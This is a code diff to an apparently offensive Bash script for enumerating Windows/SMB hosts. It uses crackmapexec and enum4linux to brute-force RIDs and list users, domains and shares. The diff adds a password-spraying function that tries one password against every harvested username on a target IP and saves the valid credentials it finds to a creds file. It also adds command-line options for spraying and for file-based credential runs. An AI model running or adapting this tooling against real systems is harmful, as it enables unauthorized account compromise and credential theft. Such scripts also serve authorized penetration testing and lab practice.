@@ -2,14 +2,45 @@
 
 init() {
     # Create the enumeration directory if it doesn't exist
-    mkdir -p enumeration
+    mkdir -p "$ENUMERATION_DIRECTORY"
     # Ensure the usernames file exists
     if [ -z "$USERNAMES_FILE" ]; then
         echo "Error: USERNAMES_FILE variable is not set."
         exit 1
     fi
     touch "$USERNAMES_FILE"
+
+    if [ -z "$CREDS_FILE" ]; then
+        echo "Error: CREDS_FILE variable is not set."
+        exit 1
+    fi
+    touch "$CREDS_FILE"
 }
+
+password_spray() {
+    local PASSWORD="$1"
+    local TOOL="passwordspraying"
+    local DIR="$ENUMERATION_DIRECTORY/$TOOL/${PASSWORD:-''}"
+    mkdir -p "$ENUMERATION_DIRECTORY/$TOOL"
+    mkdir -p "$DIR"
+
+    local TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')  # Format: YYYY-MM-DD_HH-MM-SS
+    local OUTPUT_FILE="$DIR/$TIMESTAMP.txt"  # File name with timestamp
+
+    echo "[+] Started '$PASSWORD' Spraying ..."
+    # Perform password spraying and write output to timestamped file
+    crackmapexec smb $IP -u $USERNAMES_FILE -p "$PASSWORD" --continue-on-success > "$OUTPUT_FILE"
+    # Extract valid credentials and append to creds file
+    cat "$OUTPUT_FILE" | grep + | awk -F'\\' '{print $2}' | sed 's/ $//' >> $DIR/creds.txt
+    sort $DIR/creds.txt | uniq > $DIR/temp.txt && mv $DIR/temp.txt $DIR/creds.txt
+    grep -Fvxf $CREDS_FILE $DIR/creds.txt >> $CREDS_FILE
+    rm -f "$DIR/creds.txt"
+    # Count the number of sprayed users
+    USER_COUNT=$(wc -l < "$CREDS_FILE")
+    echo -e "[+] Sprayed $USER_COUNT users :)"
+    echo "[+] Ended '$PASSWORD' Spraying"
+}
+
 
 
 crackmapexec_enum() {
@@ -24,7 +55,7 @@ crackmapexec_enum() {
     if confirm_enum "Crackmapexec RID BRUTE FORCE !"; then
         echo "[+] RID Brute Forcing ..."
         crackmapexec smb "$IP" -u "$USER" -p "$PASSWORD" --rid-brute > "$DIR"/crackmap-users.txt
-        cat "$DIR"/crackmap-users.txt | grep SidTypeUser | awk -F'\\' {'print $2'} | awk -F'(' {'print $1'} >> $DIR/usernames.txt
+        cat "$DIR"/crackmap-users.txt | grep SidTypeUser | awk -F'\\' {'print $2'} | awk {'print $1'} >> $DIR/usernames.txt
     fi
     crackmapexec smb "$IP" -u "$USER" -p "$PASSWORD" --users > "$DIR"/crackmap-users.txt
     awk '{print $5}' "$DIR"/crackmap-users.txt > "$DIR"/usersDomains.txt
@@ -32,6 +63,7 @@ crackmapexec_enum() {
     sed -E '/^\[\*\]/d;/^\[\+\]/d' "$DIR"/usersDomains.txt | awk -F'.' '!seen[$1]++ {print $1}' >> $DIR/domains.txt
     echo "[+] Enumerating Usernames ..."
     awk -F'\\' '$2 != "" {print $2}' "$DIR"/usersDomains.txt >> $DIR/usernames.txt
+    sort $DIR/usernames.txt | uniq > $DIR/temp.txt && mv $DIR/temp.txt $DIR/usernames.txt
     grep -Fvxf $USERNAMES_FILE $DIR/usernames.txt >> $USERNAMES_FILE
     echo "[+] Enumerating Shares ..."
     crackmapexec smb "$IP" -u "$USER" -p "$PASSWORD" --shares >> $DIR/shares.txt
@@ -52,7 +84,9 @@ enum4linux_enum() {
 
     echo "[+] Started $TOOL Enumeration"
     echo "[+] Enumerating Usernames ..."
-    enum4linux -U -u "$USER" -p "$PASSWORD" $IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" >> $DIR/usernames.txt
+    enum4linux -U -u "$USER" -p "$PASSWORD" $IP >> $DIR/users.txt
+    cat $DIR/users.txt | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" >> $DIR/usernames.txt
+    sort $DIR/usernames.txt | uniq > $DIR/temp.txt && mv $DIR/temp.txt $DIR/usernames.txt
     grep -Fvxf $USERNAMES_FILE $DIR/usernames.txt >> $USERNAMES_FILE
     echo "[+] Enumerating Shares ..."
     enum4linux -S -u "$USER" -p "$PASSWORD" $IP >> $DIR/shares.txt
@@ -136,6 +170,7 @@ confirm_enum() {
 
 
 nb_users() {
+    sort $USERNAMES_FILE | uniq > $ENUMERATION_DIRECTORY/temp.txt && mv $ENUMERATION_DIRECTORY/temp.txt $USERNAMES_FILE
     sed -i '/^\(administrator\|krbtgt\|guest\)$/Id' $USERNAMES_FILE
     USER_COUNT=$(wc -l < "$USERNAMES_FILE")
     echo -e "[+] Enumerated $USER_COUNT users :)"
@@ -169,59 +204,117 @@ enum() {
     fi
 }
 
-
-# Script logic
-if [ "$#" -lt 2 ]; then
+show_help() {
     echo "Usage:"
-    echo "  $0 <Domain> <IP>"
-    echo "  $0 <Domain> <IP> <Username> <Password>"
-    echo "  $0 <Domain> <IP> <File>"
+    echo "  $0 -d DOMAIN -i IP [-u USER -p PASSWORD]"
+    echo "  $0 -d DOMAIN -i IP -s PASSWORD"
+    echo "  $0 -d DOMAIN -i IP -f FILE"
+    echo "  $0 -d DOMAIN -i IP -n"
+    echo
+    echo "Options:"
+    echo "  -d, --domain       Specify the domain to enumerate."
+    echo "  -i, --ip           Specify the target IP address."
+    echo "  -u, --user         Specify the username for authentication."
+    echo "  -p, --password     Specify the password for authentication."
+    echo "  -f, --file         Specify a file containing username:password pairs."
+    echo "  -n, --no-creds     Enumerate without credentials."
+    echo "  -s, --spray        Perform a password spray with the given password."
+    echo "  -h, --help         Display this help message."
+    exit 0
+}
+
+
+# Results
+ENUMERATION_DIRECTORY="enumeration"
+USERNAMES_FILE=$ENUMERATION_DIRECTORY/"usernames.txt"
+CREDS_FILE=$ENUMERATION_DIRECTORY/"creds.txt"
+USER=""
+
+# Parsing args
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -d|--domain)
+            DOMAIN="$2"
+            shift 2
+            ;;
+        -i|--ip)
+            IP="$2"
+            shift 2
+            ;;
+        -u|--user)
+            USER="$2"
+            shift 2
+            ;;
+        -p|--password)
+            PASSWORD="$2"
+            shift 2
+            ;;
+        -f|--file)
+            FILE="$2"
+            shift 2
+            ;;
+        -n|--no-creds)
+            NO_CREDS=true
+            shift
+            ;;
+        -s|--spray)
+            SPRAY_PASSWORD="$2"
+            shift 2
+            ;;
+        -h|--help)
+            show_help
+            ;;
+        *)
+            echo "[!] Unknown option: $1"
+            exit 1
+            ;;
+    esac
+done
+
+# Displaying Usage 
+if [[ -z "$DOMAIN" || -z "$IP" ]]; then
+    echo "Usage:"
+    echo "  $0 -d DOMAIN -i IP [-u USER -p PASSWORD]"
+    echo "  $0 -d DOMAIN -i IP -f FILE"
+    echo "  $0 -d DOMAIN -i IP -n"
     exit 1
 fi
 
-DOMAIN="$1"
-IP="$2"
-ENUMERATION_DIRECTORY="enumeration"
-USERNAMES_FILE=$ENUMERATION_DIRECTORY/"usernames.txt"
 
 # Initiation the enumeration directory
 init
 
-if [ "$#" -eq 2 ]; then
-    # If only Domain and IP are provided
+# Script logic
+if [[ "$NO_CREDS" == true ]]; then
     confirm_overwrite "Enumerating Users Without Credentials"
     no_creds_enum
-elif [ "$#" -eq 3 ]; then
-    # If Domain, IP, and File are provided
-    FILE="$3"
-    if [ ! -f "$FILE" ]; then
+elif [[ -n "$SPRAY_PASSWORD" ]]; then
+    confirm_overwrite "Password Spraying"
+    password_spray "$SPRAY_PASSWORD"
+elif [[ -n "$FILE" ]]; then
+    if [[ ! -f "$FILE" ]]; then
         echo "[!] File not found: $FILE"
         exit 1
     fi
-    # Make sure it ends with \n
-    sed -i -e '$a\' $FILE
+    sed -i -e '$a\' "$FILE"  # Ensure the file ends with a newline
     confirm_overwrite "File-Based Enumeration"
     while IFS=: read -r USER PASSWORD; do
         if ! login "$USER" "$PASSWORD"; then
-            continue  # Skip to the next iteration on login failure
+            continue
         fi
-        # Proceed with the enumeration
         echo -e "[*] Running additional commands for $USER...\n"
         enum "$USER" "$PASSWORD"
-    done < <(cat "$FILE")
-else
-    # If Domain, IP, Username, and Password are provided
-    USER="$3"
-    PASSWORD="$4"
+    done < "$FILE"
+elif [[ -n "$USER" && -n "$PASSWORD" ]]; then
     confirm_overwrite "Single User Enumeration"
-
-    # Call login function
     if ! login "$USER" "$PASSWORD"; then
         echo "[!] Skipping enumeration due to login failure."
     else
-        # Proceed with enumeration if login succeeds
         enum "$USER" "$PASSWORD"
     fi
+else
+    echo "[!] Invalid arguments. Use --help for usage."
+    exit 1
 fi
 
 # Showing the number of enumerated users
